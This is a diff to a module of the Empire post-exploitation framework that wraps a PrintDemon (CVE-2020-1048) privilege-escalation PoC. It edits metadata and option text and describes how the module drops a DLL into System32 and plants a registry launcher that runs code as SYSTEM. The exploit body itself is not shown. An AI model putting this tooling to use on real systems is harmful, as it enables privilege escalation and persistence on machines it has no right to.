@@ -17,11 +17,18 @@ class Module(object):
             'Author': ['@hubbl3', '@Cx01N'],
 
             # more verbose multi-line description of the module
-            'Description': 'This is an Empire launcher PoC using PrintDemon, the CVE-2020-1048'
-                           ' is a privilege escalation vulnerability that allows a persistent '
-                           'threat through Windows Print Spooler. The vulnerability allows an '
-                           'unprivileged user to gain system-level privileges. Based on '
-                           '@ionescu007 PoC.',
+            'Description':  'This is an Empire launcher PoC using PrintDemon, the CVE-2020-1048'
+                            ' is a privilege escalation vulnerability that allows a persistent'
+                            ' threat through Windows Print Spooler. The vulnerability allows an'
+                            ' unprivileged user to gain system-level privileges. Based on'
+                            ' @ionescu007 PoC. The module prints a dll named ualapi.dll which' 
+                            ' is loaded to System32. The mdoule then places a launcher in the'
+                            ' registry which executes code as system on restart. This is an'
+                            ' Empire launcher PoC using PrintDemon, the CVE-2020-1048 is a'
+                            ' privilege escalation vulnerability that allows a persistent'
+                            ' threat through Windows Print Spooler. The vulnerability allows an'
+                            ' unprivileged user to gain system-level privileges. Based on '
+                            ' @ionescu007 PoC.',
 
             # True if the module needs to run in the background
             'Background' : False,
@@ -33,13 +40,13 @@ class Module(object):
             'NeedsAdmin' : False,
 
             # True if the method doesn't touch disk/is reasonably opsec safe
-            'OpsecSafe' : True,
+            'OpsecSafe' : False,
 
             # the module language
             'Language' : 'powershell',
 
             # the minimum language version needed
-            'MinLanguageVersion' : '2',
+            'MinLanguageVersion' : '5',
 
             # list of any references/other comments
             'Comments': ['']
@@ -50,20 +57,20 @@ class Module(object):
             # format:
             #   value_name : {description, required, default_value}
             'Agent' : {
-                # The 'Agent' option is the only one that MUST be in a module
+                # The 'Agent' option is required
                 'Description'   :   'Agent to run on.',
                 'Required'      :   True,
                 'Value'         :   ''
             },
             'LauncherCode' : {
-                # The 'Agent' option is the only one that MUST be in a module
+                # Base64 code download cradle
                 'Description'   :   'Base64 launcher code',
                 'Required'      :   True,
                 'Value'         :   ''
             },
             'PrinterName': {
-                # The 'Agent' option is the only one that MUST be in a module
-                'Description': 'Optional name for print service',
+                # The printer name to be used when registering the PrintDemon printer
+                'Description': 'Optional name for the registered printer',
                 'Required': False,
                 'Value': ''
             }
@@ -100,7 +107,6 @@ class Module(object):
         f.close()
 
         script = moduleCode
-        scriptEnd = ''
         scriptEnd = "Invoke-PrintDemon"
 
         # Add any arguments to the end execution of the script
@@ -117,5 +123,4 @@ class Module(object):
             scriptEnd = helpers.obfuscate(psScript=scriptEnd, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
         script += scriptEnd
 
-        print(script)
         return script
